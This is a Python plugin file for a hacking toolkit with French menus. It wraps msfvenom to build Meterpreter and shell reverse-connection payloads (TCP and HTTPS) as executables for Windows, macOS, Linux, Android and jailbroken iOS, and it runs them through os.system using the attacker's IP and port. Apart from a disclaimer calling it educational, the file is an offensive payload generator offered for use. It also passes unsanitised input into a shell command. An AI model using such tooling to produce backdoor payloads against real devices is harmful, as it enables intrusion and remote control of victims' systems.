import os 
from clarity.core import ClarityTool, Colors, soft_input
import sys 


class Msfvenom(ClarityTool):
    """Un outil pour générer des payloads avec msfvenom. [Added via plugin, no auto install yet]"""

    TITLE = "Auto Msfvenom"
    DESCRIPTION = "Générateur de payloads pour Metasploit Framework.[Added via plugin, no auto install yet]"

    def __init__(self):
        super().__init__(options=[
            ("Générer un payload", self.gen_msfvenom)
        ], installable=False, runnable=True)

    def gen_payloads(self, payload, lhost, lport, fmt, outfile):
        print(f"{Colors.GREEN}[+] Génération du payload...{Colors.RESET}")
        command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {outfile}"
        print(f"{Colors.CYAN}Commande : {command}{Colors.RESET}")
        os.system(command)


    def gen_msfvenom(self):
        # les soft_inputs
        print(f"{Colors.RED}[!]IMPORTANT: Je ne suis pas responsable de ce que tu fais avec ce script, ceci est a but éducatif{Colors.RESET}")
        LHOST = soft_input(f"{Colors.YELLOW}Ton ip?: ")
        LPORT = soft_input(f"Le port?: ")
        print(Colors.RESET)

        print(f"{Colors.CYAN}-------MSFVENOM DKP MENU----------")
        print("")
        print(f"{Colors.RED}[!]IMPORATANT: Nécéssite METASPLOIT{Colors.CYAN}")
        print("")
        print("[1]: Windows")
        print("[2]: Mac")
        print("[3]: Linux")
        print("[4]: Android")
        print("[5]: Ios")
        print("[0]: Exit")
        print(f"{Colors.RESET}")
        choice = soft_input(f"{Colors.ORANGE}Quelles est la catégorie demandé?(entré le bon numéro): {Colors.RESET}")

        if choice == "1":
            print("")
            print(f"{Colors.CYAN}---------WINDOWS-------")
            print("[1]: Windows Meterpreter Reverse Tcp")
            print("[2]: Windows Shell Reverse Tcp")
            print("[3]: Windows Meterpreter Reverse Https")
            print(f"[0]: Exit {Colors.RESET}")
            win_choice = soft_input(f"{Colors.ORANGE}Que veut tu en payload Windows?: {Colors.RESET}")
            if win_choice == "1":
                Msfvenom.gen_payloads("windows/meterpreter/reverse_tcp", LHOST, LPORT, "exe", "payload_win_meter_tcp.exe")
            elif win_choice == "2":
                Msfvenom.gen_payloads("windows/shell/reverse_tcp", LHOST, LPORT, "exe", "payload_win_shell_tcp.exe")
            elif win_choice == "3":
                Msfvenom.gen_payloads("windows/meterpreter/reverse_https", LHOST, LPORT, "exe", "payload_win_meter_https.exe")
            elif win_choice == "0":
                print(f"{Colors.YELLOW}Fin{Colors.RESET}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Inconnu: Fin{Colors.RESET}")
                sys.exit(0)

        elif choice == "2":
            print("")
            print(f"{Colors.CYAN}---------MAC-------")
            print("[1]: Mac Meterpreter Reverse Tcp")
            print("[2]: Mac Meterpreter Reverse Shell")
            print("[3]: Mac Meterpreter Reverse Https")
            print(f"[0]: Exit {Colors.RESET}")
            mac_choice = soft_input(f"{Colors.ORANGE}Que veut tu en payload Mac?: {Colors.RESET}")
            if mac_choice == "1":
                Msfvenom.gen_payloads("osx/x64/meterpreter_reverse_tcp", LHOST, LPORT, "macho", "payload_mac_meter_tcp.macho")
            elif mac_choice == "2":
                Msfvenom.gen_payloads("osx/x64/shell_reverse_tcp", LHOST, LPORT, "macho", "payload_mac_shell_tcp.macho")
            elif mac_choice == "3":
                Msfvenom.gen_payloads("osx/x64/meterpreter_reverse_https", LHOST, LPORT, "macho", "payload_mac_meter_https.macho")
            elif mac_choice == "0":
                print(f"{Colors.YELLOW}Fin{Colors.RESET}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Inconnu: Fin{Colors.RESET}")
                sys.exit(0)

        elif choice == "3":
            print("")
            print(f"{Colors.CYAN}---------LINUX-------")
            print("[1]: Linux Meterpreter Reverse Tcp")
            print("[2]: Linux Meterpreter Reverse Shell")
            print("[3]: Linux Meterpreter Reverse Https")
            print(f"[0]: Exit {Colors.RESET}")
            lin_choice = soft_input(f"{Colors.ORANGE}Que veut tu en payload Linux?: {Colors.RESET}")
            if lin_choice == "1":
                Msfvenom.gen_payloads("linux/x64/meterpreter_reverse_tcp", LHOST, LPORT, "elf", "payload_lin_meter_tcp.elf")
            elif lin_choice == "2":
                Msfvenom.gen_payloads("linux/x64/shell_reverse_tcp", LHOST, LPORT, "elf", "payload_lin_shell_tcp.elf")
            elif lin_choice == "3":
                Msfvenom.gen_payloads("linux/x64/meterpreter_reverse_https", LHOST, LPORT, "elf", "payload_lin_meter_https.elf")
            elif lin_choice == "0":
                print(f"{Colors.YELLOW}Fin{Colors.RESET}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Inconnu: Fin{Colors.RESET}")
                sys.exit(0)


        elif choice == "4":
            print("")
            print(f"{Colors.CYAN}---------Android-------")
            print("[1]: Android Meterpreter Reverse Tcp")
            print("[2]: Android Meterpreter Reverse Shell")
            print("[3]: Android Meterpreter Reverse Https")
            print(f"[0]: Exit {Colors.RESET}")
            and_choice = soft_input(f"{Colors.ORANGE}Que veut tu en payload Android?: {Colors.RESET}")
            if and_choice == "1":
                Msfvenom.gen_payloads("android/meterpreter/reverse_tcp", LHOST, LPORT, "apk", "payload_and_meter_tcp.apk")
            elif and_choice == "2":
                Msfvenom.gen_payloads("android/shell/reverse_tcp", LHOST, LPORT, "apk", "payload_and_shell_tcp.apk")
            elif and_choice == "3":
                Msfvenom.gen_payloads("android/meterpreter/reverse_https", LHOST, LPORT, "apk", "payload_and_meter_https.apk")
            elif and_choice == "0":
                print(f"{Colors.YELLOW}Fin{Colors.RESET}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Inconnu: Fin{Colors.RESET}")
                sys.exit(0)

        elif choice == "5":
            print("")
            print(f"{Colors.CYAN}---------IOS-------")
            print(f"{Colors.RED}Nécéssite que l'appareil soit JAILBREAKE{Colors.CYAN}")
            print("[1]: IOS Meterpreter Reverse Tcp")
            print("[2]: IOS Meterpreter Reverse Shell")
            print("[3]: IOS Meterpreter Reverse Https")
            print(f"[0]: Exit {Colors.RESET}")
            ios_choice = soft_input(f"{Colors.ORANGE}Que veut tu en payload IOS?: {Colors.RESET}")
            if ios_choice == "1":
                Msfvenom.gen_payloads("apple_ios/aarch64/meterpreter_reverse_tcp", LHOST, LPORT, "ipa", "payload_ios_meter_tcp.ipa")
            elif ios_choice == "2":
                Msfvenom.gen_payloads("apple_ios/aarch64/shell_reverse_tcp", LHOST, LPORT, "ipa", "payload_ios_shell_tcp.ipa")
            elif ios_choice == "3":
                Msfvenom.gen_payloads("apple_ios/aarch64/meterpreter_reverse_https", LHOST, LPORT, "ipa", "payload_ios_meter_https.ipa")
            elif ios_choice == "0":
                print(f"{Colors.YELLOW}Fin{Colors.RESET}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Inconnu: Fin{Colors.RESET}")
                sys.exit(0)

        
        else:
            print(f"{Colors.RED}Entrée non reconnu: Fin du script{Colors.RESET}")
            sys.exit(0)
